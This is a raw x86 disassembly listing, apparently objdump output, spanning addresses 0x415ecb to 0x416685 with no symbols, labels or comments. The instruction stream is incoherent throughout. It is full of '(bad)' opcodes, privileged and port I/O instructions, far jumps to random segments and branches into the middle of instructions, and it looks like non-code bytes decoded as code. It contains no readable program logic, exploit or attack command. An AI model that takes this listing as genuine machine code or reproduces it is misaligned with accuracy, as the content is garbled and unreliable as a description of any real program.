  415ecb:	(bad)  
  415ecd:	popf   
  415ece:	cmp    cl,BYTE PTR [edx+0xb8ce7ca]
  415ed4:	pop    esi
  415ed5:	aas    
  415ed6:	iret   
  415ed7:	xor    ch,bl
  415ed9:	cmp    al,0xab
  415edb:	jnp    0x415ece
  415edd:	xor    ch,BYTE PTR [edi+0xd]
  415ee0:	lahf   
  415ee1:	outs   dx,BYTE PTR ds:[esi]
  415ee2:	ins    BYTE PTR es:[edi],dx
  415ee3:	arpl   WORD PTR [ebx+0x185d54da],cx
  415ee9:	sbb    dh,bl
  415eeb:	cmp    al,0x75
  415eed:	daa    
  415eee:	sbb    DWORD PTR [edi+0x79],esp
  415ef1:	scas   eax,DWORD PTR es:[edi]
  415ef2:	outs   dx,DWORD PTR ds:[esi]
  415ef3:	cs cmp al,0xaf
  415ef6:	aaa    
  415ef7:	das    
  415ef8:	xchg   esp,eax
  415ef9:	xchg   ecx,eax
  415efa:	adc    DWORD PTR [esi-0x1f95f103],ecx
  415f00:	push   ebp
  415f01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f02:	or     cl,BYTE PTR ds:0xbcda2814
  415f08:	stos   DWORD PTR es:[edi],eax
  415f09:	sbb    bh,BYTE PTR [edi]
  415f0b:	mov    ch,0xb9
  415f0d:	add    BYTE PTR [eax],0xdf
  415f10:	cwde   
  415f11:	test   ecx,eax
  415f13:	xor    dh,BYTE PTR [esi-0x2a]
  415f16:	test   BYTE PTR [ecx+0x5c9239d2],0x44
  415f1d:	push   0xba89adc9
  415f22:	jecxz  0x415f31
  415f24:	or     DWORD PTR [edi],ebp
  415f26:	inc    esi
  415f27:	mov    dh,0xda
  415f29:	xor    eax,0x2f333784
  415f2e:	cmp    eax,0x352cb938
  415f33:	lods   eax,DWORD PTR ds:[esi]
  415f34:	push   ebp
  415f35:	(bad)  
  415f36:	hlt    
  415f37:	(bad)  
  415f38:	pop    edi
  415f39:	pop    ds
  415f3a:	clc    
  415f3b:	pop    edx
  415f3c:	cld    
  415f3d:	or     al,0xd3
  415f3f:	dec    ebp
  415f40:	inc    edx
  415f41:	sbb    edi,DWORD PTR [ecx+ecx*1+0x2f080420]
  415f48:	mov    edx,0x82a6d863
  415f4d:	pop    eax
  415f4e:	cmp    al,0x5a
  415f50:	lods   al,BYTE PTR ds:[esi]
  415f51:	mov    ch,0x34
  415f53:	out    0x2c,eax
  415f55:	ins    BYTE PTR es:[edi],dx
  415f56:	push   es
  415f57:	lea    ecx,[eax+0xa]
  415f5a:	in     al,0x29
  415f5c:	ja     0x415f9b
  415f5e:	inc    esi
  415f5f:	imul   ecx,esi,0xffffffc4
  415f62:	(bad)  
  415f63:	outs   dx,BYTE PTR ds:[esi]
  415f64:	inc    edx
  415f65:	mov    ch,cl
  415f67:	(bad)  
  415f68:	clc    
  415f69:	jle    0x415f90
  415f6b:	sbb    eax,0x9ec02da6
  415f70:	jl     0x415f5b
  415f72:	call   0xcf53:0xb149242d
  415f79:	adc    al,0xd1
  415f7b:	cmp    al,0xca
  415f7d:	push   es
  415f7e:	hlt    
  415f7f:	or     bh,BYTE PTR [esp+ebp*1]
  415f82:	fisub  DWORD PTR [ecx+eiz*1-0x63]
  415f86:	push   edx
  415f87:	add    ebp,DWORD PTR fs:[esi+0x7312fd79]
  415f8e:	jl     0x415fc8
  415f90:	scas   al,BYTE PTR es:[edi]
  415f91:	cmp    al,0x7
  415f93:	shr    DWORD PTR [eax+0x12c17f53],0xbb
  415f9a:	les    edi,FWORD PTR [eax]
  415f9c:	jmp    0x415fda
  415f9e:	ja     0x416014
  415fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fa1:	or     dh,BYTE PTR [edx]
  415fa3:	adc    DWORD PTR [esi],0x39
  415fa6:	in     eax,dx
  415fa7:	push   ebx
  415fa8:	mov    ds:0x7327a68,eax
  415fad:	(bad)  
  415fae:	outs   dx,BYTE PTR ds:[esi]
  415faf:	shl    BYTE PTR [edi],1
  415fb1:	test   BYTE PTR [edx+ecx*1],dl
  415fb4:	rol    DWORD PTR [esi],1
  415fb6:	cwde   
  415fb7:	daa    
  415fb8:	ret    0xa142
  415fbb:	adc    BYTE PTR [ecx+0x7d],ah
  415fbe:	je     0x415f98
  415fc0:	add    edi,DWORD PTR [ebx-0x3b]
  415fc3:	mov    ds:0x1c20524b,al
  415fc8:	cmp    dl,BYTE PTR [edi-0x42]
  415fcb:	mov    edi,0x1468c1
  415fd0:	xlat   BYTE PTR ds:[ebx]
  415fd1:	pop    eax
  415fd2:	mov    esi,esp
  415fd4:	or     esp,eax
  415fd6:	pushf  
  415fd7:	push   ds
  415fd8:	in     eax,0x84
  415fda:	leave  
  415fdb:	xchg   ecx,eax
  415fdc:	mov    esp,0x563002c2
  415fe1:	mov    ebx,0x2fdecb80
  415fe6:	adc    eax,0xed0f15ea
  415feb:	mov    ebp,DWORD PTR [esi-0x10e44b38]
  415ff1:	std    
  415ff2:	pusha  
  415ff3:	popf   
  415ff4:	addr16 inc eax
  415ff6:	pop    ss
  415ff7:	push   ebx
  415ff8:	push   eax
  415ff9:	xor    BYTE PTR [ebx-0x637efccc],bh
  415fff:	mov    DWORD PTR [eax+0x7bb89a91],0x67718c7
  416009:	es push esi
  41600b:	in     al,dx
  41600c:	and    DWORD PTR [ecx+0x1f4a91c9],ecx
  416012:	pop    ebp
  416013:	pop    edi
  416014:	or     eax,0x17836e34
  416019:	sbb    BYTE PTR [ebx],bh
  41601b:	out    0x64,al
  41601d:	push   ds
  41601e:	mov    bl,0x2b
  416020:	(bad)  
  416021:	pop    ecx
  416022:	(bad)  
  416023:	dec    esp
  416024:	lods   eax,DWORD PTR ds:[esi]
  416025:	xchg   ebp,eax
  416026:	ins    BYTE PTR es:[edi],dx
  416027:	mov    ds:0xec6f9647,eax
  41602c:	aad    0xc2
  41602e:	fistp  DWORD PTR [edx]
  416030:	inc    eax
  416031:	stos   BYTE PTR es:[edi],al
  416032:	js     0x415fbc
  416034:	cdq    
  416035:	cwde   
  416036:	mov    eax,0xc8c43e56
  41603b:	pop    esi
  41603c:	arpl   di,sp
  41603e:	jno    0x41606f
  416040:	cli    
  416041:	sbb    DWORD PTR [ebx+0x23baa1d8],esi
  416047:	iret   
  416048:	or     BYTE PTR [ebx+0x6e],ch
  41604b:	sub    eax,0x2c86c710
  416050:	add    DWORD PTR [edi],0xec5232c8
  416056:	dec    ebx
  416057:	clc    
  416058:	or     al,0xdd
  41605a:	xor    BYTE PTR [edx-0x4d],ch
  41605d:	sbb    BYTE PTR [ebx-0x17a25980],ch
  416063:	int    0x6d
  416065:	adc    dh,cl
  416067:	mov    dl,BYTE PTR [ebp-0x3e]
  41606a:	or     DWORD PTR [edi-0x120cd1d],edx
  416070:	dec    esp
  416071:	imul   ebx,DWORD PTR [edi-0x394a78f1],0xffffffca
  416078:	xchg   edx,eax
  416079:	out    dx,eax
  41607a:	xchg   ebp,eax
  41607b:	shr    al,1
  41607d:	xchg   ebp,eax
  41607e:	test   ebp,edi
  416080:	shr    ecx,1
  416082:	mov    esi,DWORD PTR [esi]
  416084:	add    BYTE PTR [edx],0x46
  416087:	pop    edi
  416088:	mov    ebx,0x5efc5c47
  41608d:	jecxz  0x4160f7
  41608f:	ret    0xf31f
  416092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416093:	mov    ah,0x73
  416095:	mov    DWORD PTR [ecx],0xa61935c6
  41609b:	(bad)  
  41609c:	jmp    0xd06b:0x28b7ccb4
  4160a3:	pop    esi
  4160a4:	(bad)  
  4160a5:	test   BYTE PTR [ebx+0x6d7d1bb4],bh
  4160ab:	add    bh,dl
  4160ad:	in     eax,0xb1
  4160af:	dec    edx
  4160b0:	push   edx
  4160b1:	sar    DWORD PTR [edi],0x23
  4160b4:	push   ebx
  4160b5:	or     ebp,DWORD PTR [edi+0x49a43e34]
  4160bb:	mov    edi,0x7b714eb
  4160c0:	pop    ecx
  4160c1:	dec    edx
  4160c2:	iret   
  4160c3:	in     al,dx
  4160c4:	pop    ecx
  4160c5:	xchg   bl,ah
  4160c7:	sbb    al,0xcc
  4160c9:	jl     0x416131
  4160cb:	inc    ecx
  4160cc:	jae    0x416068
  4160ce:	test   al,0xcb
  4160d0:	inc    ebx
  4160d1:	icebp  
  4160d2:	popf   
  4160d3:	jns    0x416147
  4160d5:	sbb    esi,ebx
  4160d7:	leave  
  4160d8:	cmp    al,0x96
  4160da:	jl     0x41612f
  4160dc:	jns    0x4160ff
  4160de:	out    0x8e,al
  4160e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e1:	cmc    
  4160e2:	adc    dh,BYTE PTR [ebx-0x2d80553b]
  4160e8:	jge    0x4160ce
  4160ea:	mov    cl,0x58
  4160ec:	cli    
  4160ed:	rcl    BYTE PTR [eax-0x2e2d23c3],cl
  4160f3:	inc    esp
  4160f4:	ror    BYTE PTR [edx-0x577b425a],cl
  4160fa:	mov    esi,0xdf060ec8
  4160ff:	adc    ebp,DWORD PTR [ecx-0x256be8a1]
  416105:	loopne 0x41608e
  416107:	mov    ds:0x422a51c4,al
  41610c:	(bad)  
  41610e:	xor    cl,BYTE PTR [esi-0x6b74f512]
  416114:	push   esp
  416115:	jns    0x416195
  416117:	inc    eax
  416118:	jmp    0x41617c
  41611a:	lock (bad) [ecx-0x5aacf69d]
  416121:	dec    esp
  416122:	mov    esi,0x4d6c1ee2
  416127:	add    eax,0x6e73c8ae
  41612c:	and    eax,0xabc57289
  416131:	inc    esp
  416132:	mov    esi,0x1efc9ec0
  416137:	sbb    BYTE PTR [edi],bl
  416139:	cmc    
  41613a:	add    eax,ebx
  41613c:	ss ffreep st(1)
  41613f:	and    al,0x9a
  416141:	mov    cl,0x42
  416143:	addr16 xchg edx,eax
  416145:	push   0xfffffff3
  416147:	dec    ecx
  416148:	dec    esi
  416149:	cmp    BYTE PTR [esi+0x609597e9],ch
  41614f:	push   ss
  416150:	push   0xb4274125
  416155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416156:	adc    dl,BYTE PTR [edi+0x12f20e75]
  41615c:	pop    es
  41615d:	pop    edx
  41615e:	and    al,BYTE PTR [ecx+0x3e47bdce]
  416164:	mov    eax,0x9f2bbc9d
  416169:	je     0x416146
  41616b:	pop    es
  41616c:	into   
  41616d:	cwde   
  41616e:	inc    ecx
  41616f:	outs   dx,DWORD PTR ds:[esi]
  416170:	mov    dl,0x85
  416172:	icebp  
  416173:	or     BYTE PTR [ebx-0x6efab4b6],cl
  416179:	mov    dl,0x79
  41617b:	mov    esi,DWORD PTR [ebp-0x6f]
  41617e:	or     eax,0xe5dd54e2
  416183:	jnp    0x416179
  416185:	retf   0x7c01
  416188:	xchg   edx,eax
  416189:	or     BYTE PTR [eax+0x322393ec],bl
  41618f:	xchg   edi,eax
  416190:	je     0x4161b9
  416192:	lahf   
  416193:	loope  0x41618c
  416195:	push   ss
  416196:	pop    ds
  416197:	push   esi
  416198:	or     DWORD PTR [esi],eax
  41619a:	xlat   BYTE PTR ds:[ebx]
  41619b:	inc    edi
  41619c:	push   esi
  41619d:	sub    DWORD PTR [ecx],edi
  41619f:	push   ebx
  4161a0:	xchg   edi,ebp
  4161a2:	pop    ss
  4161a3:	jo     0x416125
  4161a5:	mov    cl,0xa7
  4161a7:	stos   DWORD PTR es:[edi],eax
  4161a8:	fild   WORD PTR [ecx-0x4f]
  4161ab:	pop    es
  4161ac:	cmp    ebx,DWORD PTR [ecx]
  4161ae:	xor    BYTE PTR ds:0xd4bdb8b7,0x2d
  4161b5:	jns    0x4161cd
  4161b7:	adc    BYTE PTR [ebx-0x47a3f0f3],bh
  4161bd:	sbb    esi,DWORD PTR [ebp+0x1c6b9137]
  4161c3:	aaa    
  4161c4:	mov    ch,0x18
  4161c6:	ja     0x41619e
  4161c8:	sub    DWORD PTR [eax],edx
  4161ca:	leave  
  4161cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161cc:	pop    cx
  4161ce:	add    eax,0x4cc6c0c3
  4161d3:	test   BYTE PTR [ecx-0x7464b4a4],al
  4161d9:	add    bh,al
  4161db:	xor    DWORD PTR [edi+0x1e23a33b],edx
  4161e1:	aaa    
  4161e2:	mov    bh,0x69
  4161e4:	fcomp  QWORD PTR [ebx]
  4161e6:	pop    edx
  4161e7:	mov    eax,0xa508ee6d
  4161ec:	je     0x416227
  4161ee:	xor    al,0x98
  4161f0:	add    esp,DWORD PTR [esi]
  4161f2:	test   al,0xfa
  4161f4:	pop    es
  4161f5:	mov    ebx,ebx
  4161f7:	int    0x60
  4161f9:	jge    0x416234
  4161fb:	les    ecx,FWORD PTR [esi+edi*4-0x5c485376]
  416202:	int    0x3a
  416204:	repnz mov al,ds:0x4b14576a
  41620a:	rcr    DWORD PTR ds:0x9c91aee9,1
  416210:	ja     0x4161f9
  416212:	and    eax,edx
  416214:	nop
  416215:	or     al,0xb9
  416217:	mov    eax,edi
  416219:	xor    DWORD PTR [ecx+0x1766bd6e],edi
  41621f:	sub    dh,ah
  416221:	mov    cl,0xce
  416223:	lea    ecx,cs:[eax]
  416226:	(bad)  
  416227:	and    DWORD PTR [eax+ebx*1],edx
  41622a:	mov    WORD PTR [eax-0x23],cs
  41622d:	outs   dx,DWORD PTR ds:[esi]
  41622e:	adc    esp,DWORD PTR [edi+ebp*2+0x73]
  416232:	out    0xd2,eax
  416234:	cmp    bh,BYTE PTR [bp+si+0x34d6]
  416239:	mov    dl,0x12
  41623b:	sub    BYTE PTR [ebp-0xe2c5074],al
  416241:	stc    
  416242:	dec    ebx
  416243:	and    ch,BYTE PTR [edx+eiz*8]
  416246:	pop    ds
  416247:	jle    0x41622f
  416249:	jb     0x416275
  41624b:	lds    ebx,FWORD PTR [eax-0x5d13bf60]
  416251:	adc    al,0xea
  416253:	sbb    BYTE PTR [eax+0x7c],bh
  416256:	and    DWORD PTR [edi+0x45],eax
  416259:	iret   
  41625a:	cmp    bl,BYTE PTR [ecx-0x1664ca06]
  416260:	fbstp  TBYTE PTR [ebx]
  416262:	inc    ecx
  416263:	lock pop esi
  416265:	out    0x61,eax
  416267:	mov    al,ds:0x713be876
  41626c:	arpl   WORD PTR [ecx],bx
  41626e:	push   edx
  41626f:	mov    ebp,0x7e7cded9
  416274:	ins    BYTE PTR es:[edi],dx
  416275:	and    ch,BYTE PTR [ebp+0x49d09274]
  41627b:	sub    eax,0x202bf637
  416280:	push   esp
  416281:	nop
  416282:	pop    ecx
  416283:	cmp    ecx,DWORD PTR [ebp-0x57]
  416286:	inc    esp
  416287:	jge    0x4162ba
  416289:	imul   esi,DWORD PTR [ebp-0x6b],0xa61b649f
  416290:	sub    BYTE PTR [ebx+0x76],dh
  416293:	push   cs
  416294:	mov    eax,0x30e300f3
  416299:	popa   
  41629a:	cli    
  41629b:	lahf   
  41629c:	sbb    ch,bl
  41629e:	mov    ?,WORD PTR [ebx]
  4162a0:	std    
  4162a1:	icebp  
  4162a2:	test   esi,esi
  4162a4:	jmp    0x416286
  4162a6:	or     ebp,ebx
  4162a8:	or     eax,0xfa7b9d29
  4162ad:	add    al,0x8b
  4162af:	(bad)  
  4162b0:	test   al,0x83
  4162b2:	arpl   WORD PTR [edi+eiz*4+0x79dabcdc],di
  4162b9:	inc    esp
  4162ba:	xchg   esp,eax
  4162bb:	xor    bl,BYTE PTR [esi-0x56]
  4162be:	fwait
  4162bf:	push   esp
  4162c0:	sbb    DWORD PTR [edx+0x6e],esi
  4162c3:	xchg   esp,eax
  4162c4:	cmp    al,0x78
  4162c6:	dec    ecx
  4162c7:	inc    edi
  4162c8:	xchg   DWORD PTR [eax+0x53],ecx
  4162cb:	out    dx,al
  4162cc:	add    al,0x65
  4162ce:	fimul  DWORD PTR [eax+0x22e69092]
  4162d4:	jne    0x41634e
  4162d6:	inc    ebx
  4162d7:	cs scas al,BYTE PTR es:[edi]
  4162d9:	in     eax,0x85
  4162db:	xor    ebx,DWORD PTR ds:0xa2f4e0eb
  4162e1:	ror    ah,1
  4162e3:	and    ah,dl
  4162e5:	dec    ebx
  4162e6:	add    al,0x83
  4162e8:	sahf   
  4162e9:	jmp    0x501e:0x2cad889e
  4162f0:	(bad)  
  4162f1:	addr16 mov dh,0x22
  4162f4:	in     eax,0xbd
  4162f6:	out    dx,eax
  4162f7:	fwait
  4162f8:	xor    ah,BYTE PTR [ebx-0x7141531a]
  4162fe:	(bad)  [eax]
  416300:	arpl   WORD PTR [edi+0x3541f06],dx
  416306:	cmp    eax,0xbab21590
  41630b:	scas   eax,DWORD PTR es:[edi]
  41630c:	test   BYTE PTR [ebx],cl
  41630e:	or     ebp,esp
  416310:	aam    0x1d
  416312:	pop    ds
  416313:	jmp    0x2cf9bbd
  416318:	sbb    ch,dl
  41631a:	icebp  
  41631b:	xor    dl,dh
  41631d:	lock and eax,0x99524144
  416323:	sahf   
  416324:	inc    ebx
  416325:	sub    al,0x5d
  416327:	rol    BYTE PTR [ecx+0x3a847a29],1
  41632d:	jns    0x416358
  41632f:	mov    cl,0xdc
  416331:	and    al,0x9b
  416333:	pop    ecx
  416334:	xor    esp,ebx
  416336:	sbb    BYTE PTR [edi+eiz*1-0x7828fbc],cl
  41633d:	cmp    DWORD PTR [eax-0x441b07d3],ebp
  416343:	in     al,0x6d
  416345:	push   cs
  416346:	lods   eax,DWORD PTR ds:[esi]
  416347:	shl    esi,1
  416349:	sbb    eax,0x908afdeb
  41634e:	aaa    
  41634f:	cmp    al,0x38
  416351:	rcr    DWORD PTR [esi],cl
  416353:	daa    
  416354:	add    ecx,edx
  416356:	test   eax,0x86b6b28a
  41635b:	(bad)  
  41635c:	and    ah,BYTE PTR [esi+0x3a09c07a]
  416362:	jb     0x416357
  416364:	ds push 0x50
  416367:	dec    esp
  416368:	arpl   bp,sp
  41636a:	add    ebp,DWORD PTR [ebx-0x3b]
  41636d:	mov    es,WORD PTR [ebx+0x5b]
  416370:	cld    
  416371:	popa   
  416372:	mov    ah,0xb9
  416374:	pop    esp
  416375:	cli    
  416376:	pop    esi
  416377:	loopne 0x416316
  416379:	jbe    0x4163ca
  41637b:	sub    BYTE PTR [edi+ebx*8+0x2e4ddb80],0xb4
  416383:	mov    cl,0x12
  416385:	dec    ebp
  416386:	aaa    
  416387:	add    BYTE PTR [ebp+0x22],0x53
  41638b:	stc    
  41638c:	(bad)  
  41638d:	out    0xcf,al
  41638f:	sub    eax,0x861ecbee
  416394:	add    ebp,edi
  416396:	inc    esi
  416397:	push   edi
  416398:	fnsave [edx]
  41639a:	jnp    0x41632b
  41639c:	(bad)  
  41639d:	ss (bad) 
  41639f:	fmul   QWORD PTR [eax-0x27]
  4163a2:	add    eax,0xc5d2b009
  4163a7:	mov    eax,0x7dd34408
  4163ac:	jne    0x41635e
  4163ae:	pop    es
  4163af:	(bad)  
  4163b0:	not    ecx
  4163b2:	push   esp
  4163b3:	jmp    0x4163da
  4163b5:	ss mov ah,0x89
  4163b8:	clc    
  4163b9:	push   cs
  4163ba:	sbb    eax,0xaf91db68
  4163bf:	adc    ecx,ebx
  4163c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163c2:	lock int 0xc2
  4163c5:	push   eax
  4163c6:	dec    esp
  4163c7:	and    DWORD PTR [eax+0xd],0x484541fb
  4163ce:	in     eax,dx
  4163cf:	jp     0x416391
  4163d1:	push   ebx
  4163d2:	inc    ebp
  4163d3:	adc    esp,ebp
  4163d5:	lds    ebp,FWORD PTR [ecx]
  4163d7:	pop    edx
  4163d8:	leave  
  4163d9:	pop    ds
  4163da:	or     esp,ecx
  4163dc:	loopne 0x41643c
  4163de:	(bad)  
  4163e0:	xchg   ebp,eax
  4163e1:	push   edx
  4163e2:	cmp    ebx,DWORD PTR [eax]
  4163e4:	push   ebp
  4163e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e6:	stos   DWORD PTR es:[edi],eax
  4163e7:	xlat   BYTE PTR ds:[ebx]
  4163e8:	stos   BYTE PTR es:[edi],al
  4163e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ea:	mov    esp,0xc702c1c4
  4163ef:	cmp    eax,0xce8163c
  4163f4:	ret    
  4163f5:	xchg   ebp,eax
  4163f6:	fs push ds
  4163f8:	mov    esi,DWORD PTR [edx]
  4163fa:	dec    ebx
  4163fb:	cmp    dl,bh
  4163fd:	test   BYTE PTR [edi],ah
  4163ff:	(bad)  
  416401:	jp     0x41647c
  416403:	mov    edx,0xc0ae27ad
  416408:	xor    BYTE PTR [edi-0x11],ch
  41640b:	cmp    eax,0x26548fd
  416410:	gs pop ebp
  416412:	or     al,BYTE PTR [esi+ebx*8+0x17255ef]
  416419:	fldl2e 
  41641b:	push   0xffffffb7
  41641d:	fs mov esi,0x53ce2d7c
  416423:	jg     0x416448
  416425:	call   0xa071586e
  41642a:	sbb    dl,BYTE PTR [ecx-0x36e73cc2]
  416430:	imul   BYTE PTR gs:[ebx-0x2b]
  416434:	xchg   DWORD PTR [edx-0x37],ebx
  416437:	sbb    al,0xdf
  416439:	ror    DWORD PTR [edi+0x6d],0xc5
  41643d:	or     edi,DWORD PTR [ebx+0x3d]
  416440:	add    DWORD PTR [ecx-0x5e4be195],eax
  416446:	adc    BYTE PTR gs:[edi],bh
  416449:	or     al,0x90
  41644b:	clc    
  41644c:	int3   
  41644d:	je     0x416486
  41644f:	add    BYTE PTR ds:[eax-0x3a],bh
  416453:	pop    ebp
  416454:	xor    eax,0xa91556ed
  416459:	cmp    edx,DWORD PTR [esi]
  41645b:	je     0x416483
  41645d:	fs push es
  41645f:	push   edx
  416460:	aad    0x92
  416462:	mov    dl,BYTE PTR [ebp-0x635bb216]
  416468:	scas   eax,DWORD PTR es:[edi]
  416469:	aaa    
  41646a:	add    BYTE PTR [ecx+0x121616b5],al
  416470:	fisttp WORD PTR [ebx+0x3743fcca]
  416476:	mov    cl,0xcd
  416478:	fs in  al,dx
  41647a:	pusha  
  41647b:	scas   eax,DWORD PTR es:[edi]
  41647c:	jbe    0x416467
  41647e:	out    0x90,eax
  416480:	add    DWORD PTR [eax+0x5730c90b],edi
  416486:	sub    ah,BYTE PTR [ebx+0x39]
  416489:	dec    ecx
  41648a:	(bad)  [eax-0x43]
  41648d:	xor    BYTE PTR ss:[ecx],bl
  416490:	adc    DWORD PTR [ecx-0x1c74ac91],edx
  416496:	jb     0x4164b1
  416498:	dec    ecx
  416499:	pushf  
  41649a:	or     eax,0x8661cb47
  41649f:	sbb    bl,0xb2
  4164a2:	pop    ebx
  4164a3:	mov    al,BYTE PTR [edx+eax*2+0x7c7242dd]
  4164aa:	push   ecx
  4164ab:	jno    0x41648f
  4164ad:	jg     0x416463
  4164af:	ins    DWORD PTR es:[edi],dx
  4164b0:	mov    al,ds:0x249a6683
  4164b5:	xchg   ebx,esi
  4164b7:	jno    0x41645f
  4164b9:	pop    ecx
  4164ba:	push   ds
  4164bb:	jmp    FWORD PTR [esi+0x5b43c57f]
  4164c1:	pop    esi
  4164c2:	mov    ah,0x9e
  4164c4:	xchg   esi,eax
  4164c5:	bound  edi,QWORD PTR [edx+0x20c6e951]
  4164cb:	pop    ds
  4164cc:	sub    ebp,ecx
  4164ce:	icebp  
  4164cf:	mov    esp,0x12006f8b
  4164d4:	dec    esp
  4164d5:	into   
  4164d6:	aad    0x1d
  4164d8:	aad    0x2a
  4164da:	mov    al,0x1a
  4164dc:	retf   
  4164dd:	mov    bl,0x8a
  4164df:	adc    BYTE PTR [ebx-0x6a3f2f86],bl
  4164e5:	fisttp DWORD PTR [eax+0x7a]
  4164e8:	xchg   esi,eax
  4164e9:	pop    edi
  4164ea:	cli    
  4164eb:	jnp    0x4164a8
  4164ed:	stos   BYTE PTR es:[edi],al
  4164ee:	stos   BYTE PTR es:[edi],al
  4164ef:	adc    ah,dh
  4164f1:	push   ds
  4164f2:	ja     0x4164a1
  4164f4:	jo     0x416483
  4164f6:	lods   al,BYTE PTR ds:[esi]
  4164f7:	ficom  DWORD PTR [edx-0x23]
  4164fa:	lock xchg dl,cl
  4164fd:	inc    esi
  4164fe:	les    edi,FWORD PTR [esi-0x2914dd0b]
  416504:	call   0x9ee9:0x35ab07ae
  41650b:	cmp    al,0x56
  41650d:	ret    0x2161
  416510:	mov    esi,0xb836a97a
  416515:	pusha  
  416516:	std    
  416517:	test   eax,0xa8b5a952
  41651c:	clc    
  41651d:	stos   BYTE PTR es:[edi],al
  41651e:	xor    al,0x3d
  416520:	push   es
  416521:	dec    eax
  416522:	pop    eax
  416523:	out    0xc5,al
  416525:	test   eax,0xb5c6fd5b
  41652a:	hlt    
  41652b:	mov    edx,0x6c8d319f
  416530:	pop    ecx
  416531:	jle    0x41653a
  416533:	je     0x416558
  416535:	sub    DWORD PTR [ebx-0x24edebcd],0xffffffdc
  41653c:	cli    
  41653d:	js     0x4164dd
  41653f:	fwait
  416540:	push   esp
  416541:	and    bh,ah
  416543:	push   edx
  416544:	and    BYTE PTR [ebp-0x1f],dl
  416547:	hlt    
  416548:	retf   0xf169
  41654b:	fmul   DWORD PTR [esi+eiz*2-0x32fdb9a7]
  416552:	cwde   
  416553:	pusha  
  416554:	inc    edi
  416555:	sar    al,0x18
  416558:	inc    esp
  416559:	or     eax,0xfbd1de13
  41655e:	jno    0x4165ca
  416560:	enter  0xeed1,0xeb
  416564:	xor    esp,DWORD PTR [ecx+0x425c8475]
  41656a:	mov    bl,0xd8
  41656c:	je     0x4164f6
  41656e:	xchg   edx,eax
  41656f:	(bad)  
  416570:	imul   edx,DWORD PTR [ecx+0x58],0xffffffd9
  416574:	int3   
  416575:	xor    eax,0x92797a76
  41657a:	daa    
  41657b:	push   edx
  41657c:	adc    edx,0xd5fea0b9
  416582:	jmp    0x54deee24
  416587:	out    0x1e,al
  416589:	test   DWORD PTR [ebx+0x1e],eax
  41658c:	loop   0x416576
  41658e:	fcomp  DWORD PTR [ebx]
  416590:	jae    0x4165d6
  416592:	adc    al,0x9e
  416594:	push   ds
  416595:	sub    al,0x66
  416597:	jmp    0x416587
  416599:	dec    edx
  41659a:	imul   esi,DWORD PTR [edi],0xffffffc7
  41659d:	bnd jle 0x416619
  4165a0:	add    al,0x48
  4165a2:	nop
  4165a3:	fstp   QWORD PTR [ecx-0x53]
  4165a6:	sbb    ah,bh
  4165a8:	(bad)  
  4165a9:	js     0x41660d
  4165ab:	adc    ecx,DWORD PTR [edi]
  4165ad:	jmp    0xfea1cc97
  4165b2:	dec    edx
  4165b3:	mov    eax,ds:0x232dc607
  4165b8:	ins    DWORD PTR es:[edi],dx
  4165b9:	and    al,0xc3
  4165bb:	jnp    0x416586
  4165bd:	jp     0x4165ec
  4165bf:	sti    
  4165c0:	mov    ch,0xaa
  4165c2:	mov    al,ds:0x38669421
  4165c7:	cld    
  4165c8:	dec    esi
  4165c9:	mov    esi,0xaaa365d8
  4165ce:	dec    ecx
  4165cf:	div    edi
  4165d1:	pop    ecx
  4165d2:	mov    dl,0xbf
  4165d4:	rol    ebx,cl
  4165d6:	lea    edi,[edx+0x6a8c5727]
  4165dc:	in     eax,dx
  4165dd:	dec    esp
  4165de:	lds    edi,FWORD PTR [ebx-0x623abf66]
  4165e4:	push   edi
  4165e5:	int    0xf2
  4165e7:	inc    eax
  4165e8:	jno    0x4165db
  4165ea:	jne    0x4165d9
  4165ec:	cli    
  4165ed:	cmp    esi,DWORD PTR [esi+edi*8-0x21334a30]
  4165f4:	imul   eax,DWORD PTR [esi-0x13],0x84a60231
  4165fb:	in     eax,0xdb
  4165fd:	and    ebp,DWORD PTR [ecx+0x6a4a209e]
  416603:	mov    dh,0x2
  416605:	mov    edx,0x2549e85
  41660a:	jp     0x41664a
  41660c:	adc    eax,0xbd6ae7ed
  416611:	push   esp
  416612:	xchg   ebx,eax
  416613:	mov    esi,0x53c9b457
  416618:	and    eax,0xdbf9cc9c
  41661d:	(bad)  
  41661e:	outs   dx,DWORD PTR ds:[esi]
  41661f:	inc    DWORD PTR [ebx-0x1c]
  416622:	xchg   ecx,eax
  416623:	dec    esp
  416624:	inc    ecx
  416625:	sub    eax,0x6c46bc92
  41662a:	lods   al,BYTE PTR ds:[esi]
  41662b:	imul   esi,DWORD PTR [eax],0xfffffff4
  41662e:	leave  
  41662f:	outs   dx,DWORD PTR ds:[esi]
  416630:	ror    BYTE PTR [ebp+ebp*4-0x45ff4268],cl
  416637:	pusha  
  416638:	inc    esi
  416639:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41663b:	xchg   ebx,eax
  41663c:	xchg   edx,eax
  41663d:	or     eax,0x86b46675
  416642:	sbb    eax,0x36fcc45c
  416647:	pushf  
  416648:	jmp    0x416662
  41664a:	mov    ah,0x57
  41664c:	sbb    eax,0x1cbab038
  416651:	dec    edi
  416652:	scas   al,BYTE PTR es:[edi]
  416653:	test   eax,0x4897c601
  416658:	inc    edx
  416659:	push   eax
  41665a:	xor    BYTE PTR [edi],0x57
  41665d:	jle    0x416610
  41665f:	iret   
  416660:	js     0x41663e
  416662:	cld    
  416663:	lahf   
  416664:	outs   dx,BYTE PTR ds:[esi]
  416665:	ficomp WORD PTR [edx+0xc511f1c]
  41666b:	dec    edi
  41666c:	int    0x2e
  41666e:	test   BYTE PTR [eax+0x66],cl
  416671:	pusha  
  416672:	(bad)  
  416673:	mov    ebp,0x17057c93
  416678:	push   ebx
  416679:	in     eax,dx
  41667a:	ins    DWORD PTR es:[edi],dx
  41667b:	xchg   ebp,eax
  41667c:	jle    0x4166e4
  41667e:	repz dec ebx
  416680:	cmp    esi,ecx
  416682:	aad    0xab
  416684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416685:	mov    bh,0xf5
